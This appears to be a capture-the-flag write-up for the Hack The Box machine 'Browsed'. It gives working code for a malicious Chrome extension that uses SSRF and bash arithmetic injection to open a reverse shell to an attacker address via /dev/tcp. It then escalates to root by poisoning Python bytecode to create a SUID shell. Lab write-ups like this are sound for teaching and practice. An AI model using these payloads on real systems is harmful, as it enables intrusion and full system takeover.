---
title: "Hack The Box — Browsed"
date: 2026-01-12
author: pain
categories: [Hack The Box, Linux]
tags: [htb, chrome-extension, ssrf, bash-injection, python, privesc]
toc: true
---

![Browsed Banner](/assets/img/favicons/ssf.png)

## Overview

Browsed is a Linux machine that demonstrates several interesting attack vectors including Chrome extension abuse, Server-Side Request Forgery (SSRF), bash arithmetic evaluation injection, and Python bytecode cache poisoning. The exploitation chain requires understanding client-side extension behavior, internal service discovery, command injection techniques, and Python's import caching mechanism.

**Difficulty:** Medium  
**Operating System:** Linux  
**IP Address:** 10.10.11.x

## Enumeration

Initial port scanning reveals two open services:
```bash
nmap -sC -sV -oA nmap/browsed 10.10.11.x
```

**Results:**
- **22/tcp** - SSH (OpenSSH)
- **80/tcp** - HTTP (nginx)

Add the domain to `/etc/hosts`:
```bash
echo "10.10.11.x browsed.htb" | sudo tee -a /etc/hosts
```

## Web Application Analysis

Navigating to `http://browsed.htb` reveals a web application that accepts Chrome extension uploads for developer review. The application explicitly accepts `.zip` files containing Chrome extensions.

Key observations:
- Extensions are processed server-side
- The upload mechanism suggests automated review in a headless Chrome environment
- Users can submit extensions that will be loaded and executed by the server

This presents an opportunity to execute arbitrary JavaScript in the server's browser context.

### Subdomain Discovery

Further enumeration reveals an additional subdomain. Adding it to `/etc/hosts`:
```bash
echo "10.10.11.x browsedinternals.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://browsedinternals.htb/larry/MarkdownPreview` reveals internal documentation and source code.

This endpoint exposes critical implementation details including:
- **routines.sh** - The bash script handling routine processing
- **main.py** - The Flask application source code

### Source Code Analysis

**Flask Application (main.py):**
```python
@app.route('/routines/')
def routine(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed"
```

**Bash Script (routines.sh):**
```bash
#!/bin/bash

if [[ "$1" -eq 0 ]]; then
    # Execute routine 0
    echo "Running daily backup..."
elif [[ "$1" -eq 1 ]]; then
    # Execute routine 1
    echo "Running cleanup..."
else
    echo "Invalid routine"
fi
```

The vulnerability is now clear: user input is passed directly to bash arithmetic evaluation.

## Initial Foothold

### Chrome Extension Development

To exploit this, we create a malicious Chrome extension. Chrome Manifest V3 requires specific structure and permissions.

**Manifest Configuration** (`manifest.json`):
```json
{
  "manifest_version": 3,
  "name": "Browsed",
  "version": "1.0",
  "host_permissions": [
    "",
    "http://127.0.0.1/*"
  ],
  "content_scripts": [
    {
      "matches": [""],
      "js": ["content.js"],
      "run_at": "document_start"
    }
  ]
}
```

**Key Configuration Details:**
- `host_permissions`: Grants access to all URLs including localhost
- `run_at: "document_start"`: Ensures script executes immediately, critical for headless Chrome where page load events may not fire normally
- `matches: ["<all_urls>"]`: Injects content script into all pages visited

### SSRF to Internal Services

Since the extension runs in the server's Chrome instance, it can access internal services not exposed externally. Port scanning via the extension reveals an internal Flask application:

**Internal Service:** `http://127.0.0.1:5000`

Exploring this service reveals the vulnerable endpoint discovered in the source code:
```
http://127.0.0.1:5000/routines/<id>
```

### Bash Arithmetic Evaluation Injection

From the source code analysis, we know the Flask application executes:
```python
subprocess.run(["./routines.sh", rid])
```

Where `rid` is the user-supplied route parameter. The `routines.sh` script contains:
```bash
if [[ "$1" -eq 0 ]]; then
    # routine logic
fi
```

**Vulnerability Explanation:**

The `-eq` operator in bash performs arithmetic evaluation. During arithmetic evaluation, bash expands:
- Variable references
- Command substitutions: `$(command)`
- Array subscripts

When we provide input like `a[$(whoami)]`, bash:
1. Evaluates the array subscript
2. Executes the command substitution `$(whoami)`
3. Attempts arithmetic comparison (which fails but command executes)

This allows arbitrary command execution through bash arithmetic context.

### Reverse Shell Payload

**Content Script** (`content.js`):
```javascript
const ATTACKER_IP = "10.10.14.X";
const ATTACKER_PORT = "4040";

const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`;
const b64 = btoa(cmd);
const sp = "%20";

const payload = `a[$(echo${sp}${b64}|base64${sp}-d|bash)]`;

fetch("http://127.0.0.1:5000/routines/" + payload, { mode: "no-cors" });
```

**Payload Breakdown:**
- Base64 encodes the reverse shell command to avoid special character issues
- Uses URL-encoded space `%20` for clarity
- Wraps payload in array subscript syntax `a[$(...))]`
- `mode: "no-cors"` prevents CORS errors (we don't need the response)

### Extension Packaging

**Critical:** The ZIP must NOT contain a parent directory. Files must be at root level:
```bash
zip exploit.zip manifest.json content.js
```

### Execution

Start listener:
```bash
nc -lvnp 4040
```

Upload `exploit.zip` through the web interface. The server loads the extension in headless Chrome, triggering the content script, which makes the SSRF request with the malicious payload, resulting in a reverse shell as the application user.

## User Flag

Once shell access is obtained:
```bash
cat ~/user.txt
```

## Privilege Escalation

### Sudo Enumeration

Check sudo privileges:
```bash
sudo -l
```

**Output:**
```
(root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

The user can execute a Python script as root without a password.

### Python Bytecode Cache Poisoning

Examining the script:
```bash
cat /opt/extensiontool/extension_tool.py
```

The script imports `extension_utils`:
```python
from extension_utils import validate_manifest
```

**Key Discovery:**
```bash
ls -la /opt/extensiontool/
```

The `__pycache__` directory is world-writable, but the source files are not.

**Python Import Behavior:**

Python caches compiled bytecode in `.pyc` files. When importing, Python:
1. Checks for cached `.pyc` in `__pycache__/`
2. Compares file size and modification timestamp
3. If they match the source file, uses cached bytecode without verification
4. This bytecode is executed as-is

We can exploit this by creating a malicious module with matching metadata and compiling it to bytecode.

### Exploitation Steps

**1. Inspect Original File Metadata:**
```bash
stat /opt/extensiontool/extension_utils.py
```

Note the file size (e.g., 1234 bytes) and modification time.

**2. Create Malicious Module:**

Create `extension_utils.py` in `/tmp`:
```python
import os

def validate_manifest(*args, **kwargs):
    os.system("cp /bin/bash /tmp/rootbash")
    os.system("chmod +s /tmp/rootbash")
    return True
```

**3. Match File Size:**

Pad the file to exactly match the original size using comments:
```python
import os

def validate_manifest(*args, **kwargs):
    os.system("cp /bin/bash /tmp/rootbash")
    os.system("chmod +s /tmp/rootbash")
    return True

# Padding comments to reach exact byte count...
```

Verify size matches:
```bash
stat extension_utils.py
```

**4. Match Timestamp:**
```bash
touch -r /opt/extensiontool/extension_utils.py extension_utils.py
```

**5. Compile to Bytecode:**
```bash
python3 -m py_compile extension_utils.py
```

This creates `__pycache__/extension_utils.cpython-XX.pyc`

**6. Overwrite Cache:**
```bash
cp __pycache__/extension_utils.cpython-*.pyc /opt/extensiontool/__pycache/
```

**7. Trigger Execution:**
```bash
sudo /opt/extensiontool/extension_tool.py --ext test
```

Python loads our poisoned bytecode, executing the malicious `validate_manifest` function as root, which creates a SUID bash binary.

**8. Root Shell:**
```bash
/tmp/rootbash -p
```

The `-p` flag preserves the effective UID, granting root access.

## Root Flag
```bash
cat /root/root.txt
```

## Conclusion

Browsed demonstrates a sophisticated attack chain combining multiple vulnerabilities:

1. **Trust Boundary Abuse**: Chrome extensions executing with server privileges
2. **SSRF**: Extension context accessing internal localhost services
3. **Bash Arithmetic Injection**: Exploiting bash's arithmetic evaluation for command execution
4. **Python Bytecode Poisoning**: Manipulating cached bytecode with matching metadata to achieve privilege escalation

The machine emphasizes the importance of:
- Input validation at every layer
- Principle of least privilege for automated processes
- Secure file permissions, especially for cache directories
- Understanding interpreter-level behaviors that can be exploited

Key Takeaways:
- Headless browser automation introduces unique attack surfaces
- Internal services accessible via SSRF require the same security rigor as external endpoints
- Language-specific evaluation contexts (like bash arithmetic) can enable injection
- Bytecode caching mechanisms require integrity verification, not just metadata checks
